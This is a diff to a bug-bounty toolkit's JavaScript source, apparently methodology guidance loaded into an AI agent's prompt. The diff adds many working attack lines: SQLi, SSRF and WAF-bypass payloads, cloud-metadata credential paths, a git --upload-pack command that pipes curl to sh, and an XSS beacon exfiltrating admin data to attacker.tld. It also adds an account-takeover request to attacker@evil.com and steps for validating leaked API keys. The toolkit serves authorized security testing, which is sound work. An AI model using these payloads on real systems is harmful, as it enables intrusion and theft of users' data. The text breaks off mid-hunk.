@@ -1,12 +1,14 @@
 // dsh-bugbounty — keyless bug bounty recon & finding toolkit for DSH.
 // Zero-import pure ESM: no @deepseek-ai/* imports; global fetch/AbortController
-// only. Registers 39 `bb_*` tools (enum, probe, headers, tech, wayback, recon,
+// only. Registers 48 `bb_*` tools (enum, probe, headers, tech, wayback, recon,
 // checklist, source-audit, triage, actuator, js-secrets, 403-bypass, origin-ip,
 // crlf, swagger, s3, punycode, mass-assign, email-payloads, nextjs-cve,
 // ct-fresh-assets, wordpress, cache-deception, sqli-param-hunt, waf-fingerprint,
 // cors-scan, git-exposure, sensitive-files, ntlm-probe, graphql-introspection,
 // source-leak-scan, shadow-api, soft404-check, vpn-fingerprint, dns-email-audit,
-// entra-tenant-probe, cache-key-probe, ratelimit-classify, nosqli-auth-probe)
+// entra-tenant-probe, cache-key-probe, ratelimit-classify, nosqli-auth-probe, jwt-analyze, cloud-storage-scan,
+// psbdmp-search, dockerhub-search, dangling-cname, dns-wildcard-probe,
+// resurrected-endpoints, api-docs-diff, h1-intel)
 // plus methodology guidance at systemPrompt
 // order 115. Exports bbApi (neutral {name, execute} map) for reuse from other
 // hosts (e.g. the OpenCode adapter).
@@ -387,7 +389,11 @@ const CHECKLIST = [
 			"Pull subdomains from public APIs: Wayback CDX (fl=original&collapse=urlkey), crt.sh, VirusTotal, urlscan.io, CommonCrawl",
 			"Scrape GitHub repos (github-subdomains -t <token>) and Shodan (shosubgo / shodan domain <d>) for extra hosts",
 			"Map ASN/CIDR infra with asnmap -d <domain> | dnsx, amass intel -org/-cidr/-asn and correlate IPs from VT/OTX/urlscan",
-			"httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 -silent | grep -v 404 — alive-filter live hosts across common ports on every collected subdomain"
+			"httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 -silent | grep -v 404 — alive-filter live hosts across common ports on every collected subdomain",
+			"gf-classified candidate files: cat urls.txt | gf xss / gf sqli / gf ssrf -> per-class candidates; open-redirect param regex (\\?|&)(redirect|next|return|dest|destination|go|forward|target|redir|url|continue|returnTo|returnUrl|callback|out|link)=",
+			"Full CT history not just fresh: crt.sh full JSON history flags SANs absent from current DNS -> dead-asset revival candidates; HTTP/2-only services evade old WAFs/scanners (curl --http2); trigger a 500 (malformed JSON / huge header / weird method) to read the upstream error page past a generic WAF",
+			"Subdomain pattern triage: api-v2/api-internal/admin/dashboard/backstage/internal/dev/staging/test/beta/preprod/vpn/remote/jira/confluence => test this class first; cdn-assets-static often out-of-scope",
+			"JS-bundle endpoint extraction via LinkFinder/SecretFinder over all collected JS"
 		],
 		techniques: ["bb_enum_subdomains", "bb_wayback_urls", "crt.sh", "HackerTarget", "RDAP/whois", "subfinder", "assetfinder", "findomain", "chaos", "github-subdomains", "shosubgo", "asnmap", "httpx-toolkit port sweep"]
 	},
@@ -408,7 +414,10 @@ const CHECKLIST = [
 			"JS mining: katana | grep .js | nuclei -t http/exposures/, LinkFinder, SecretFinder, grep aws_key/password/oauth",
 			"Takeover check: subzy run --concurrency 100 --verify_ssl + can-i-take-over-xyz; .git via httpx -path /.git/config -ms [core]",
 			"SQLi pipeline: gf sqli | uro | anew && sqlmap -m sqli.txt --batch --level 2 --risk 2; qsreplace time/error probes",
-			"LFI probe: qsreplace /etc/passwd + match root:x:0:0; SSRF: qsreplace 169.254.169.254/latest/meta-data/ + match ami-id"
+			"LFI probe: qsreplace /etc/passwd + match root:x:0:0; SSRF: qsreplace 169.254.169.254/latest/meta-data/ + match ami-id",
+			"AXFR check: dig AXFR <domain> @<NS> -> '[CRITICAL] AXFR SUCCESS'; SPF +all -> email spoofing; DMARC p=none -> HIGH",
+			"Wildcard DNS probe: query random labels (openssl rand -hex 8) — all resolve to the same IP = wildcard zone; use IP-set cardinality to choose body-hash dedup",
+			"High-value management port list: 9200/9300 ES, 27017 Mongo, 6379 Redis, 5432 PG, 3306 MySQL, 11211 Memcached, 5984 CouchDB, 1521 Oracle, 1433 MSSQL, 8500 Consul, 4040/6066/7077 Spark, 8086 InfluxDB, 5601 Kibana, 15672 RabbitMQ, 8161 ActiveMQ, 9000 SonarQube/Portainer, 3000 Grafana, 8081 Jenkins, 7474 neo4j, 9090 Prometheus, 8888 Jupyter, 9870/50070 Hadoop, 2375/2376/4243 Docker, 6443/10250 k8s, 28017 Mongo-http, 8443, 50000 DB2/SAP, 5985/5986 WinRM, 5900-5902 VNC; honeypot triage nmap --script=http-honeypot; 'filtered' != closed — re-test from another region"
 		],
 		techniques: ["bb_probe_http", "bb_recon", "ffuf", "dirsearch", "katana", "alterx", "dnsx", "naabu", "masscan", "gau", "arjun", "LinkFinder", "SecretFinder", "subzy", "sqlmap", "qsreplace"]
 	},
@@ -426,7 +435,11 @@ const CHECKLIST = [
 			"Scale sequential-ID enumeration with Burp Intruder on trailing digits of encoded/numeric IDs",
 			"Test destructive IDOR: cancellation/refund endpoints replaying another user's ID without ownership checks",
 			"Test feedback/comment endpoints: swap userId to read others' PII (phone/email/org) or submit content as them",
-			"Blind-XSS feedback fields (name/designation) to fire in an internal admin panel"
+			"Blind-XSS feedback fields (name/designation) to fire in an internal admin panel",
+			"Iterate IDs beyond plain ints: base64-decode the ID to extract a numeric incrementor; exfil emails, order totals, payment methods across the whole customer base",
+			"UUID harvest from static JS: curl -s https://target.com/static/app.js | grep -Eo '\"id\":\"[a-f0-9-]{36}\"' | sort -u",
+			"A->B chain table: same IDOR on /v2/ -> /v1/ (missing fix) -> mobile API; IDOR on GET /api/user/X/orders -> PUT/DELETE same path -> all sibling endpoints",
+			"Zero-interaction ATO: PATCH /api/users/{victim_uid} with attacker session + {\"email\":\"attacker@evil.com\"} -> trigger password reset -> reset email arrives at attacker -> full ATO"
 		],
 		techniques: ["bb_wayback_urls (find id params)", "burp auth analyzer", "role swap", "method override", "Base64 ID swap", "Burp Intruder enumeration"]
 	},
@@ -439,7 +452,11 @@ const CHECKLIST = [
 			"Feed internal addresses: 127.0.0.1, 169.254.169.254 (cloud metadata), ::1, 0.0.0.0",
 			"Use DNS rebinding and URL-parser tricks (user@host, encoded dots, IPv6 forms)",
 			"Check redirect-following: 302s to internal hosts from open redirects",
-			"Prove impact: read cloud metadata, reach internal admin panels, port-scan localhost"
+			"Prove impact: read cloud metadata, reach internal admin panels, port-scan localhost",
+			"IP-encoding arsenal to dodge filters: decimal http://2130706433 (127.0.0.1), octal http://0177.0.0.1, hex http://0x7f000001, short forms http://127.1 / http://0 / http://0.0.0.0, IPv6-mapped [::ffff:127.0.0.1], mixed 0x7f.1",
+			"Non-HTTP request-tool chains raise impact beyond plain fetch: git/curl/wget/ffmpeg/convert/wkhtmltopdf — e.g. git clone with --upload-pack=curl example.com|sh https://attacker/repo.git = code exec on the fetch host",
+			"Cloud metadata matrix on ANY SSRF (AWS first): IMDSv1 http://169.254.169.254/latest/meta-data/iam/security-credentials/<role> AND IMDSv2 token-grab PUT /latest/api/token + X-aws-ec2-metadata-token-ttl-seconds:21600; GCP /computeMetadata/v1/?recursive=true&alt=json + Metadata-Flavor: Google; Azure /metadata/instance?api-version=2021-02-01 + Metadata: true",
+			"OOB validation discipline: sub-tag the collaborator domain per sink (import.<collab>, webhook.<collab>, dlsrc.<collab>) so callbacks identify the exact firing path"
 		],
 		techniques: ["bb_wayback_urls (find url params)", "interactsh", "dns rebinding", "metadata endpoints"]
 	},
@@ -460,7 +477,13 @@ const CHECKLIST = [
 			"Email verification must be tied to the CURRENT email state (verify B, revert to A; swap un-clicked links)",
 			"JWT revocation: replay a logged-out JWT in Postman/Burp — server must reject (no blacklist = flaw)",
 			"Check sensitive API endpoints validate session server-side, not just cookie presence (replay profile-save after logout)",
-			"Test unlimited session duration / static remember-me tokens after hours-days of inactivity"
+			"Test unlimited session duration / static remember-me tokens after hours-days of inactivity",
+			"Password change without current_password field: POST /api/password {\"new_password\":\"Pwned#2026\"} — no old-password check = straight account takeover",
+			"Refresh-token reuse without rotation detection: a leaked refresh token minting fresh access tokens forever (replay the same refresh twice)",
+			"Lifecycle tests: session survives logout (old token still works), survives password change (replay session A), not regenerated on login (session fixation — compare token before/after login)",
+			"Session fixation chain: craft a link carrying a pre-set session ID, victim authenticates into it, attacker replays it",
+			"Missing post-logout invalidation — old session token still valid after logout, replay on protected endpoints",
+			"Validation discipline: use TWO real sessions (attacker A + victim B), body-diff every 200, OOB confirmation for theft chains; standalone attribute gaps are Low/Informational"
 		],
 		techniques: ["bb_security_headers", "jwt_tool", "hashcat", "host header injection", "EditThisCookie", "session lifecycle tests"]
 	},
@@ -480,7 +503,11 @@ const CHECKLIST = [
 			"Blind XSS: payloads in feedback/form fields + X-Forwarded-For header; OOB callbacks via dalfox --blind <collaborator>",
 			"DOM XSS: audit sinks (location, innerHTML, eval, postMessage) with --deep-domxss and manual browser confirm",
 			"Stored XSS mass hunt: gau/waybackurls | grep -iE '(login|signup|register|forgot|password|reset)' | nuclei -t http/xss/ -severity critical,high — stored sinks in auth/form pages",
-			"DOM XSS pipeline: Gxss -c 100 | sort -u | dalfox pipe — auto-generate payload-injected URL variants and confirm DOM/reflected execution"
+			"DOM XSS pipeline: Gxss -c 100 | sort -u | dalfox pipe — auto-generate payload-injected URL variants and confirm DOM/reflected execution",
+			"Use a UNIQUE NUMERIC CANARY, not alert(1) — proof = your alert(<canary>) reflected raw with unescaped angle brackets (e.g. <script>alert(91234)</script>)",
+			"Context probes: aaa\"bbb'ccc<ddd>eee` ; attribute onmouseover=\"alert(CANARY)\" ; URL javascript:alert(CANARY)",
+			"Blind-XSS planting: <svg onload=fetch('//bxss-<sink>-<random>.<collab>/x')> — sub-tag per sink so callbacks identify the firing path",
+			"XSS -> ATO beacon payload: fetch('/api/admin/users',{credentials:'include'}).then(r=>r.json()).then(d=>navigator.sendBeacon('https://attacker.tld/',JSON.stringify(d)))"
 		],
 		techniques: ["bb_wayback_urls (find params)", "burp collaborator", "XSS hunter", "CSP evaluator", "gau", "gf xss", "Gxss", "kxss", "dalfox", "httpx-toolkit -ct", "stored-XSS grep | nuclei critical,high"]
 	},
@@ -493,7 +520,12 @@ const CHECKLIST = [
 			"Blind detection: time-based (SLEEP/BENCHMARK) and boolean-based diffs",
 			"Map DB type via error fingerprints (MySQL, Postgres, MSSQL, Oracle)",
 			"Try WAF bypass: case mixing, comments, hex encoding, chunked encoding",
-			"Extract data via UNION / error-based / stacked queries; document evidence"
+			"Extract data via UNION / error-based / stacked queries; document evidence",
+			"Per-DB error-coercion payloads: MSSQL ' AND 1=CONVERT(int,(SELECT @@version))-- ; Oracle ' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))-- ; PostgreSQL ' AND 1=CAST((SELECT version()) AS int)-- ; MySQL ' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
+			"Per-DB OOB exfil: MSSQL xp_dirtree, Oracle UTL_HTTP.REQUEST / DBMS_LDAP.INIT, PostgreSQL COPY ... TO PROGRAM (RCE-tier) or dblink_connect, MySQL LOAD_FILE('\\\\<collab>\\x')",
+			"ORDER BY injection (un-parameterizable column, most WAFs miss it): sort=(CASE WHEN (SELECT version() LIKE 'PostgreSQL%') THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)",
+			"Header-based second-order: User-Agent: ' AND SLEEP(5)-- — bypasses parameter-focused WAF rules because headers are treated as trusted server metadata",
+			"Statistical timing proof (false-positive killer): run 10 baseline + 10 injected requests; mean injected time must exceed mean baseline by >= the sleep duration AND stddev < sleep/3 — a single slow response is not proof"
 		],
 		techniques: ["sqlmap", "burp intruder", "error fingerprinting", "WAF bypass"]
 	},
@@ -506,7 +538,10 @@ const CHECKLIST = [
 			"Coupon/promo abuse: reuse, stack, apply to disallowed items",
 			"Rate-limit gaps: signup, OTP resend, password reset, balance top-up",
 			"Race conditions (TOCTOU): double-spend, double-claim, duplicate redemption",
-			"Privilege flows: order status transitions, referral abuse, loyalty manipulation"
+			"Privilege flows: order status transitions, referral abuse, loyalty manipulation",
+			"Price manipulation (client-provided price), negative quantity, integer overflow quantity:9999999999",
+			"Coupon stacking + parallel single-use coupon race; remove item after discount",
+			"Multi-step workflow state-token bypass; limited-quantity item races"
 		],
 		techniques: ["burp turbo intruder", "race condition patterns", "negative value fuzzing"]
 	},
@@ -519,7 +554,14 @@ const CHECKLIST = [
 			"GraphQL: introspection, field suggestion, query depth/alias abuse",
 			"Mass assignment: send extra fields (role=admin, isAdmin=true, balance=999)",
 			"Excessive data: list endpoints returning internal fields; check .json/.xml accept headers",
-			"Broken object/function level auth on API routes; unversioned deprecated endpoints"
+			"Broken object/function level auth on API routes; unversioned deprecated endpoints",
+			"Behavioral diff on zombie/deprecated versions: a rate-limit or validation regression on /api/v1 vs /api/v2 is only a complete finding once chained to brute-forceable impact (login, OTP, enumeration)",
+			"Method confusion: GET 403 vs POST 200; OPTIONS to enumerate; full method loop GET/HEAD/POST/PUT/PATCH/DELETE/TRACE/CONNECT/PROPFIND/MKCOL/COPY/MOVE/LOCK",
+			"Trailing-slash routing inconsistency: /api/users 401 vs /api/users/ 200",
+			"Documentation rot: diff /openapi.json + /swagger.json (live + wayback) against live probes — missing endpoints exist, declared endpoints are gone",
+			"JSONP/CORS candidate harvest: grep -E \"(\\?|&)(callback|jsonp|cb|_callback)=\" over collected URLs",
+			"BOLA/BFLA endpoint targets: /admin/users, /admin/audit-logs, impersonate, role-change; BFLA test = admin-level call with a regular-user JWT; Swagger UI pre-filled real tokens; API-key echo in response headers",
+			"Rate-limit bypass via header rotation X-Forwarded-For/X-Real-IP/True-Client-IP/CF-Connecting-IP + method swap POST<->GET"
 		],
 		techniques: ["bb_wayback_urls (find api paths)", "graphql introspection", "mass assignment", "ffuf api wordlists"]
 	},
@@ -533,7 +575,13 @@ const CHECKLIST = [
 			"Check takeover fingerprints: 404 from S3 bucket name, 404 NoSuchBucket era patterns",
 			"Claim the resource on free tiers and verify a file you upload is served",
 			"Report impact: phishing, cookie scope, SEO poisoning",
-			"subzy run --targets <file> --concurrency 100 --hide_fails --verify_ssl — automated CNAME + fingerprint takeover verification across the subdomain list"
+			"subzy run --targets <file> --concurrency 100 --hide_fails --verify_ssl — automated CNAME + fingerprint takeover verification across the subdomain list",
+			"Modern fingerprints: Azure DevOps cloudapp.azure.com regional-pool re-issue (1-click OAuth ATO via wildcard reply_to), Zendesk help-desk takeover -> email interception -> password-reset chain, Vercel cname.vercel-dns.com deleted-project takeover",
+			"Confirmation pair: dig CNAME <sub> (CNAME exists) + dig A <cname-target> (NXDOMAIN/no resolution)",
+			"Automation: subjack -w subs.txt -t 100 -timeout 30 -ssl -c fingerprints.json ; subzy run --targets subs.txt",
+			"Dangling CNAME at an OAuth redirect_uri = account takeover — confirmation is the code actually arriving at the claimed host",
+			"CloudFront dangling: CNAME -> cloudfront.net + HTTP 403 + body 'Bad request' = claimable distribution",
+			"Dangling DNS provider list to test: herokuapp.com, ghost.io, azurewebsites.net, s3.amazonaws.com, surge.sh, netlify.app, readme.io"
 		],
 		techniques: ["bb_enum_subdomains", "dig CNAME", "nuclei takeover templates", "can-i-take-over-xyz", "subzy run --concurrency 100 --hide_fails --verify_ssl"]
 	},
@@ -546,7 +594,16 @@ const CHECKLIST = [
 			"State business impact (data leaked, accounts taken over, $ lost) — this drives payout",
 			"Suggest remediation for each root cause",
 			"Check the program's scope, rules, and duplicate policy before submitting",
-			"Keep a disclosure timeline if no-response: 30-90 day policy depending on program"
+			"Keep a disclosure timeline if no-response: 30-90 day policy depending on program",
+			"HAR sanitization before sharing: jq filter to strip Cookie/Set-Cookie/Authorization headers; never ship raw HARs with secrets",
+			"Title formula: '[Bug Class] in [Endpoint] allows [actor] to [impact]' — NEVER 'could potentially' or 'may allow'",
+			"7-Question Gate Q1: if you CANNOT write step 2 as a real HTTP request -> KILL IT. Never-submit list: missing CSP/HSTS/security headers alone, missing SPF/DKIM/DMARC, GraphQL introspection alone (no auth bypass/IDOR), banner/version disclosure without a working CVE exploit, clickjacking on non-sensitive pages, tabnabbing",
+			"Client-comm note for source-map exposure: redeploying does not fix it — only GENERATE_SOURCEMAP=false (or stripping .map at deploy) + CDN purge closes it; a team that redeploys and checks the old link will wrongly claim victory",
+			"Mid-engagement IR template: subject 'Mid-engagement mitigation deployed for <vuln X>' with impact caveat that the original vuln existed for the engagement window",
+			"Finding output contract: Title/Severity/Confidence/Attack Prerequisites/Endpoint/Attack Path/Why Exploitable/Realistic Impact/PoC Request/Suggested Verification/Fix",
+			"ONLY-report classes + minimum evidence: raw HTTP, expected vs actual, concrete impact; hard exclusions: missing headers, clickjacking w/o PoC, rate-limit w/o bypass, unconfirmed version CVEs, self-XSS, CSRF on login/logout",
+			"CVSS v3.1 quick table: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H=10.0; stored-XSS-ATO example 8.7; severity decision matrix + downgrade conditions",
+			"Per-platform formats: HackerOne/Bugcrowd/Intigriti/YesWeHack markdown templates + triager checklists + rejection triggers + tone rules; platform severity mapping (H1 CVSS ranges / BC P1-P5 / IGT / YWH)"
 		],
 		techniques: ["CVSS scoring", "hackerone/other program docs", "writeup templates"]
 	},
@@ -582,7 +639,14 @@ const CHECKLIST = [
 			"Verify program scope BEFORE any testing; pick programs with clear scope, decent reward-to-effort, responsive triage",
 			"Never access data belonging to other users; stop immediately if real user data is reached",
 			"Report confirmed vulnerabilities within 24 hours; no public disclosure before vendor acknowledgment",
-			"Keep evidence (requests, responses, timeline) and a disclosure timeline if the program goes silent"
+			"Keep evidence (requests, responses, timeline) and a disclosure timeline if the program goes silent",
+			"Scope gate in code, not LLM judgment: deterministic checker with apex/*.sub/CIDR/re: patterns, default-deny, exits non-zero if any asset is out of scope so it can gate automation",
+			"Quarantine collisions explicitly into loot/quarantined_<source>.txt so the process is auditable",
+			"Program intake watcher: HackerOne published-programs feed https://hackerone.com/programs/search?query=<org>&sort_type=published_at&page=1 (Accept: application/json) — keyless",
+			"Scope pull: https://hackerone.com/<handle>/policy_scopes/all_eligible/json (keyless JSON) then canonicalize with jq -S . and diff vs stored copy for scope-change alerts",
+			"Notifiers: Slack webhook curl -X POST -H 'Content-type: application/json' --data '{\"text\":\"new finding\"}' $SLACK_WH ; Telegram sendDocument for report files; Discord file upload",
+			"Scope corner cases: wildcard *.target.com excludes the apex, nested subdomains included; reward-tier focus — test the tiers with the worst controls first; dev/staging parallel testing note",
+			"Auth-aware pipeline: plumb cookie/bearer/api-key through httpx/katana/ffuf/nuclei/dalfox; run TWO sessions (low-priv + high-priv) and diff responses; keep credentials in .private/ gitignored"
 		],
 		techniques: ["program docs (hackerone/bugcrowd)", "scope checker", "CVSS severity", "disclosure policy"]
 	},
@@ -602,7 +666,10 @@ const CHECKLIST = [
 			"Rapid sequential OTP guesses with IP rotation; look for missing lockout/throttling",
 			"Compare session ID across signup->verification->onboarding and try reuse across accounts; look for unchanged session (fixation vector)",
 			"Send attacker@mail.com%00victim@mail.com and username%00.jpg in signup fields; look for truncated storage/display",
-			"Register аdmin@example.com (xn--dmin-7cd@example.com) vs admin@example.com; look for a normalization collision enabling takeover"
+			"Register аdmin@example.com (xn--dmin-7cd@example.com) vs admin@example.com; look for a normalization collision enabling takeover",
+			"Partial-construction race: register an arbitrary email, then confirm it through the construction window with a blank token — POST /register + GET /confirm?token= fired together, repeat ~20 rounds",
+			"CAPTCHA placement gaps: CAPTCHA on the registration form but forgotten on password reset, API endpoint, or mobile API path (/api/register vs /register)",
+			"Response-diff enumeration on forgot-password: valid vs invalid email produce different responses"
 		],
 		techniques: ["signup endpoint crawl (/api/v1/register, /auth/create, /user/create, /legacy/signup, /mobile/register)", "Burp Intruder numbers for OTP/rate-limit", "punycode homograph collider", "session fixation probes"]
 	},
@@ -632,7 +699,12 @@ const CHECKLIST = [
 			"Run nuclei -t prsnl/credentials-disclosure-all.yaml (exposures dir) at -c 30; look for regex-matched credentials in responses",
 			"Extract with lazyegg --js_urls --domains --ips --leaked_creds --local_storage; look for leaked creds, internal domains, localStorage tokens",
 			"Feed gospider JS URLs to jsleaks -s -k; look for JS-only endpoints manual review misses",
-			"Grep bundles for AIza[0-9A-Za-z_-]{35} (Google), AKIA[0-9A-Z]{16} (AWS), eyJ jwt headers, /api/ endpoints"
+			"Grep bundles for AIza[0-9A-Za-z_-]{35} (Google), AKIA[0-9A-Z]{16} (AWS), eyJ jwt headers, /api/ endpoints",
+			"ALWAYS re-derive the content-hash live: HASH=$(curl -s https://$TARGET/ | grep -oE 'main\\\\.[a-f0-9]+\\\\\\.js' | head -1); asset-manifest.json for all chunk paths; Next.js BUILD_ID extraction (_next/static/<id>/_buildManifest.js)",
+			"Bundle tooling: unwebpack-sourcemap (extract all sources), source-map-explorer (visualize), trufflehog filesystem on the pulled bundle",
+			"build-info / info.json: git commit hash + build timestamp + dependency versions -> direct CVE targeting",
+			"DOM-sink + postMessage grep over bundles: addEventListener('message', ...) with indexOf/startsWith prefix checks; innerHTML/outerHTML/document.write sinks",
+			"Endpoint regex over bundles: grep -oP '[\\\"\\x27](/[a-z0-9_/-]{3,})[\\\"\\x27]'; REACT_APP_SECRET_KEY=/AWS_ACCESS_KEY= assignment patterns; /debug/ and /__debug__/ endpoints"
 		],
 		techniques: ["katana -jc / gau | anew", "httpx -mc 200 liveness", "jsleak -s -l -k", "nuclei credentials-disclosure templates", "lazyegg + EndPointer auto-parser"]
 	},
@@ -679,7 +751,9 @@ const CHECKLIST = [
 			"Header-based SQLi X-Forwarded-Host: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z; look for time delays",
 			"Header-based XSS X-Forwarded-Host: evil.com\"><img src/onerror=prompt(document.cookie)>; look for reflection into HTML",
 			"SSRF via Host with internal hostnames like internal-service.local; look for internal API or metadata responses",
-			"Try special chars, encoded values and path traversal (target.com%00.attacker.com, %74%61%72%67%65%74.com, ../../attacker.com); look for parser errors"
+			"Try special chars, encoded values and path traversal (target.com%00.attacker.com, %74%61%72%67%65%74.com, ../../attacker.com); look for parser errors",
+			"Full header set: Host: attacker.com / X-Forwarded-Host: attacker.com / X-Host: attacker.com / X-Forwarded-Server: attacker.com / dual-Host smuggling 'Host: target.com\\r\\nHost: attacker.com'",
+			"False-positive killer: many apps put attacker.com in the email but the actual link domain is server-pinned — READ the actual email (OOB confirm via controlled inbox/Collaborator), do not infer from the reflected header"
 		],
 		techniques: ["X-Forwarded-Host reset/redirect poisoning", "ffuf Host: FUZZ wordlist", "duplicate Host / absolute URL", "header-based SQLi/XSS payloads"]
 	},
@@ -697,7 +771,12 @@ const CHECKLIST = [
 			"Pace requests under the window (time.sleep(0.9)); look for never tripping the block",
 			"Rotate proxies (proxychains / Python proxies list); look for per-IP counting that proxies defeat",
 			"Try CAPTCHA bypass libraries (GoogleRecaptchaBypass / CloudflareBypassForScraping); look for a solvable challenge unlocking unlimited attempts",
-			"Target OTP/2FA resend and QR/secret-key endpoints (resend OTP, regenerate code, disable 2FA); look for missing rate limiting on the most sensitive flows"
+			"Target OTP/2FA resend and QR/secret-key endpoints (resend OTP, regenerate code, disable 2FA); look for missing rate limiting on the most sensitive flows",
+			"4-state classifier — a 200/401 with no 429 does NOT mean 'no rate limiting': distinguish hard lockout vs soft IP-throttle vs CAPTCHA-injection vs silent shadow-throttling; burst twice and compare 429/timing deltas — the delta IS the proof",
+			"OTP math: 6-digit OTP = 1,000,000 combinations — the full 000000-999999 keyspace is reachable if no per-attempt limit",
+			"Token-entropy bar: any 'weak token' claim must be backed by an actual measurement (Burp Sequencer effective bits, ent, or demonstrated counter/timestamp structure)",
+			"ReDoS bar: super-linear (doubling) latency growth against a benign-control comparison; linear growth is not ReDoS",
+			"Path-trick trio when a limit exists: /api/login vs /api/login/ vs /api/login.json"
 		],
 		techniques: ["X-Forwarded-For/True-Client-IP/CF-Connecting-IP rotation", "mirror endpoint enumeration", "method + param-name switching", "proxychains / IP rotation", "OTP/2FA endpoint targeting"]
 	},
@@ -715,7 +794,9 @@ const CHECKLIST = [
 			"JWT alg:none / role tampering on protected endpoints; look for privilege escalation to admin",
 			"Remove the Host header and IP-spoofing headers; look for the server defaulting to 127.0.0.1/localhost and granting access",
 			"Check alternate subdomains/ports and Wayback snapshots of the restricted path; look for public copies or misconfigured twins",
-			"Automate with ffuf 403 header+URL payload wordlists, verifying every hit by content length and body (4-ZERO-3 style); look for false positives"
+			"Automate with ffuf 403 header+URL payload wordlists, verifying every hit by content length and body (4-ZERO-3 style); look for false positives",
+			"Complete auth-bypass header list: X-Forwarded-For, X-Real-IP, X-Originating-IP, X-Remote-IP, X-Remote-Addr, X-Client-IP, X-Host, X-Forwarded-Host, X-Original-URL, X-Rewrite-URL, X-Custom-IP-Authorization, True-Client-IP, Cluster-Client-IP, CF-Connecting-IP (brute with ffuf -H 'FUZZ: 127.0.0.1' -w headers.txt)",
+			"Vhost brute via Host header: ffuf -u https://$TARGET/ -H 'Host: FUZZ.example.com' -w subdomains-top1million-110000.txt -mc 200,301,302 -fs 0"
 		],
 		techniques: ["method switching + --path-as-is", "X-Original-URL/X-Rewrite-URL header spoofing", "4-ZERO-3 wordlists", "ffuf 403 payload automation", "HTTP/1.0 downgrade"]
 	},
@@ -803,7 +884,13 @@ const CHECKLIST = [
 			"Ghauri --confirm, --prefix \"')/**/\", --suffix \"--+\", --dbms, --tech=T, --time-sec, --delay; look for human-like blind/time-based pacing",
 			"Junk-data body stuffing (large junk= param) against Fortinet/FortiWeb-class WAFs; look for injections passing past the body-inspection limit",
 			"Test WAF body-size limits per provider (Cloudflare 128KB, AWS WAF 8-64KB, Akamai 8-128KB, Azure 128KB); look for SQLi bypassing truncated inspection",
-			"OOB/DNS exfiltration with --dns-domain and --technique=O; look for DNS queries confirming blind SQLi when in-band is unavailable"
+			"OOB/DNS exfiltration with --dns-domain and --technique=O; look for DNS queries confirming blind SQLi when in-band is unavailable",
+			"HTTP/2-only services evade old WAFs/scanners: curl --http2 / httpx -http2",
+			"Trigger a 500 (malformed JSON / huge header / weird method) to read the upstream error page past a generic WAF",
+			"Multiple stacks behind one reverse proxy — hit different paths to fingerprint all of them",
+			"Per-WAF bypass rates: Cloudflare free 90% trivial, AWS WAF 70% likely, ModSecurity CRS 98%, Sucuri 92%, Azure Front Door 85-90%",
+			"Encoding table: double-URL %2527, HTML entity &#x27;/&#039;, unicode fold U+02BC, overlong %c0%a7; SELECT/**/1/**/FROM + %09 tabs",
+			"Content-type confusion: JSON body sent as text/plain, form-encoded w/ JSON body, multipart boundary oddities, nested parts; path case /API/Search; X-HTTP-Method-Override"
 		],
 		techniques: ["proxychains sqlmap rotation", "vendor-matched tamper combos (max 3)", "junk-data stuffing / body-size limits", "--ignore-code / --hex / --no-cast", "OOB DNS exfiltration"]
 	},
@@ -820,7 +907,16 @@ const CHECKLIST = [
 			"Grafana path normalization with encoded traversals (..%2F, %5C, double-encoded %252f%255C) in /public/ and /a/ plugin routes; look for external domains or 127.0.0.1 accepted as routing targets",
 			"Grafana open redirect via /public/..%2F%5Coast.pro%2F%3f%2F..%2F..; look for a silent redirect to an external OOB domain",
 			"Forged plugin.json whose module points to an attacker server; look for remote JS execution in the Grafana origin (XSS to ATO), and client-side SSRF via 127.0.0.1 / cloud metadata IPs",
-			"Find exposed Grafana via Shodan/FOFA (title:\"Grafana\", icon_hash=\"2123863676\", body=\"Grafana v11.6.0\"); look for versions older than 11.0.1 and run the CVE-2025-4123 template"
+			"Find exposed Grafana via Shodan/FOFA (title:\"Grafana\", icon_hash=\"2123863676\", body=\"Grafana v11.6.0\"); look for versions older than 11.0.1 and run the CVE-2025-4123 template",
+			"EoL-window logic: CVEs published after a product's EoL are permanently unpatched on old farms (e.g. SharePoint 2013) — Critical-severity findings, not info",
+			"Pre-auth network-reachable management-plane CVEs (vCenter, VPN, routers) are same-day Critical callouts, not Medium info-disclosure",
+			"Confirmed CVE -> capture a baseline; if the appliance updates mid-test, capture the patched state as a SECOND finding (regression evidence)",
+			"Next.js playbook: Server Actions CSRF via Origin:null; /_next/image SSRF following redirects; middleware bypass via _next/data JSON drops; rewrites-proxy SSRF from next.config.js {source:'/api/:path*',destination:'http://internal/'}; __NEXT_DATA__ sensitive props",
+			"Laravel playbook: debug-mode RCE (Ignition CVE-2021-3129), APP_KEY leak -> session cookie forging, Eloquent mass assignment via GET object then PATCH extra fields, debug error page stack traces",
+			"Spring Boot playbook: actuator alt paths when /actuator blocked; heapdump strings heap.bin | grep -i password|secret|token|aws_access or Eclipse MAT; SpEL ${7*7}->49; Thymeleaf SSTI",
+			"Django playbook: debug toolbar, SECRET_KEY -> session forging (django-session-forger), ORM injection via __ lookups in filter(), admin default creds + user enum via error messages",
+			"WordPress playbook: xmlrpc.php brute-force WAF bypass + pingback SSRF, REST user enum, admin-ajax.php actions after a subscriber account = plugin escalation",
+			"Rails playbook: YAML deserialization (old psych), strong-params misses -> mass assignment, SECRET_KEY_BASE leak -> session forging, send_file path traversal"
 		],
 		techniques: ["x-middleware-subrequest + x-middleware-rewrite probes", "coffinxp nuclei-templates (nextjs-middleware-cache.yaml)", "Grafana icon_hash 2123863676 / title dorks", "CVE-2025-29927 / CVE-2025-4123 nuclei templates"]
 	},
@@ -838,7 +934,10 @@ const CHECKLIST = [
 			"Recover deleted files and history with git restore . / git checkout . on dumped repos; look for historical secrets",
 			"Validate found keys with KeyHacks; look for live keys before reporting",
 			"Dork `\"GEMINI_API_KEY\"` and /AIza[0-9A-Za-z_-]{35}/ plus path:/.env, path:/*.js, org:/domain filters; look for leaked Gemini/Google keys",
-			"Validate Google keys against https://generativelanguage.googleapis.com/v1beta/models?key=KEY; look for a 200 model list vs API_KEY_INVALID errors; test File API, referer-restricted keys, corpora persistence and generation endpoints (gemini-2.5-flash, imagen, veo)"
